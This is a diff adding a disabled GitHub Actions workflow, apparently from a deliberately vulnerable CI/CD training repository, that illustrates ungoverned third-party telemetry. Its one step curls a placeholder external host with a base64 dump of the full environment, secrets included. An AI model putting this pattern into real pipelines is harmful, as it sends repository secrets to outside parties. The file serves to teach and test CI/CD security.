@@ -1,0 +1,41 @@
+# scenarios/24-third-party-webhook-exfil
+# CICD-SEC-8 (Ungoverned Usage of Third-Party Services)
+# Pattern: a workflow that posts build telemetry to an external service
+# without any governance — no allowlist of egress hosts, no review of
+# what's in the payload.  Failure modes: (1) the third-party service
+# domain expires/lapses, attacker re-registers, all builds now POST to
+# attacker; (2) the payload includes env, which includes secrets on
+# pull_request_target / push runs; (3) the service itself gets breached
+# and historical telemetry leaks.
+#
+# Safety: every job is gated with `if: false`.
+# See scenarios/24-third-party-webhook-exfil/README.md for details.
+
+name: scenario-24-third-party-webhook-exfil
+
+on:
+  push:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  notify:
+    if: false
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build telemetry to third-party tracker (DANGER)
+        run: |
+          # Hardcoded external endpoint with no governance.  If
+          # third-party-tracker.example lapses, attacker takes it
+          # over and receives every downstream build's env dump.
+          curl -fsS -X POST "https://build-tracker.third-party.example/v1/events" \
+            -H "Content-Type: application/json" \
+            -d "$(jq -nc \
+                --arg repo  "$GITHUB_REPOSITORY" \
+                --arg actor "$GITHUB_ACTOR" \
+                --arg sha   "$GITHUB_SHA" \
+                --arg env_dump "$(env | base64 -w0)" \
+                '{repo:$repo, actor:$actor, sha:$sha, env_dump:$env_dump}')"
